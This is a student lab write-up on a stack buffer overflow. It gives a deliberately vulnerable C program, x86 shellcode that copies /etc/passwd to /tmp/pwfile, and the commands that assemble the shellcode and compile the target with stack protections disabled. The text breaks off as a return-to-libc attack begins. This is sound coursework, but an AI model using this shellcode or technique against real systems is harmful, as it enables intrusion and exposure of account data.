# Lab #1, 22110082, Nguyen Duc Tri, INSE330380E_01FIE
# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    char local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile
```
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80
```

 **Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: 
## 1. Create the assembly shell code named `shellcode.asm` and the given C code named `vuln.c`:
*Copy the assembly code above and save it in the assembly file:* <br> 

## 2. First, compile the Assembly ShellCode: 
*Use `nasm` to assemble the code into an object file:*

```sh
nasm -f elf32 -o shellcode.o shellcode.asm
```

*Link the object file to create an executable file using `ld`:* 

```sh
ld -m elf_i386 -o shellcode shellcode.o
```

*Observe the shellcode in machine format:* 

```sh
for i in $(objdump -d shellcode |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
```
*The printed result shows a 97 bytes long:*

![image](https://github.com/user-attachments/assets/993994e9-3fc9-4a0b-9c94-f813142612a7)





## 3. Next, compile the C program: 
*Compile the C code using `gcc`:* <br> 

```sh
gcc -g vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
```


## 4. Stack Frame Visualization: 
![image](https://github.com/user-attachments/assets/9a7f47b2-94da-4e3f-8255-f84f2c618f6f)

*The program has a vulnerability in the `strcpy` call, where an attacker can overflow the buffer variable in `main`. This allows us to overwrite the saved return address on the stack.* 

## 5. Conduct an attack: 
*In this case, I will use a Return-to-lib-c attack* <br> 
*First, we need to know the address of `system()`, `exit()`, `/bin/sh` 






